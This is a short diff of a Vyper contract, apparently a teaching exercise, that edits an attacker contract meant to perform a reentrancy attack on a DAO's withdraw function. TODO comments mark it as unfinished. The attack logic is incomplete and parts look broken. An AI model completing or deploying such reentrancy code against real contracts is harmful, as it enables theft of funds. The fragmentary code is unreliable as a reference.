@@ -7,7 +7,6 @@ dao_address: public(address)
 owner_address: public(address)
 is_attack: public(bool)
 counter: public(uint256)
-stolen: public(uint256)
 
 @external
 def __init__():
@@ -44,10 +43,10 @@ def attack(dao_address:address):
     # TODO: Start the reentrance attack
     #if(self.counter > 0):
         #_attack = false
-    self.stolen += DAO(self.dao_address).withdraw()
+    DAO(self.dao_address).withdraw()
 
     # TODO: After the recursion has finished, send all funds (deposited and stolen) to the sender
-    send(msg.sender,deposited_amount+stolen)
+    send(msg.sender,DAO(dao_address).userBalances[msg.sender])
     
     pass
 
